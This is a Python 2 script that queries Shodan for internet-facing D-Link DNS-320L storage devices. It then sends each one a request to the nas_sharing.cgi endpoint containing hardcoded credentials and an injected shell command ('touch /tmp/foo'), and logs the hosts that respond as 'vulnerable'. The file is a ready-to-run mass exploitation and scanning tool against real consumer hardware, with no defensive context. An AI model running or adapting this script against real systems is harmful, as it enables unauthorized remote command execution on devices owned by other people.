import urllib2
import shodan
import socket
import httplib

SHODAN_API_KEY= 'YOURKEY'

api = shodan.Shodan(SHODAN_API_KEY)

def ipRange(start_ip, end_ip):
	start = list(map(int, start_ip.split(".")))
	end = list(map(int, end_ip.split(".")))
	temp = start
	ip_range = []
   
	ip_range.append(start_ip)
	while temp != end:
		start[3] += 1
		for i in (3, 2, 1):
			if temp[i] == 256:
				temp[i] = 0
				temp[i-1] += 1
		ip_range.append(".".join(map(str, temp)))    
     	return ip_range

def findResultString(twonkyResponse):
	if twonkyResponse.find("file_name") != -1:
		return True
	else:
		return False

def requestResultUrls(url):
	try: 
		serverResponse = urllib2.urlopen(url, timeout = 5).read()
		serverCheck = findResultString(serverResponse)
		if serverCheck == True:
			print "Server Up and vulnerable: %s" % url
			with open('serverHTTP.txt', 'a') as serverFileHTTP:
				serverFileHTTP.write(url + "\n")
	except urllib2.URLError:
		pass
	except socket.timeout:
		pass
	except socket.error:
		pass
	except httplib.BadStatusLine:
        	pass	
# sample usage
'''
try:	
	for x in range(1,10):
		results = api.search('DNS-320L', page=x)
		#print "Results found: %s" %results['total']
		for result in results['matches']:
			#requestTwonkyUrls(result['ip_str'], result['port'])
			#print result['ip_str'], result['port']
			with open('d_link.txt','a') as resultFile:
				resultFile.write("http://" + result['ip_str']+ "/cgi-bin/nas_sharing.cgi?dbg=1&cmd=51&user=mydlinkBRionyg&passwd=YWJjMT%20IzNDVjYmE&start=1&count=1;touch+/tmp/foo" + "\n")
except shodan.APIError, e:
	print "Error: %s"%e
'''
with open('d_link.txt', 'r') as resultFile:
	for line in resultFile:
		url = line.strip()
		requestResultUrls(url)
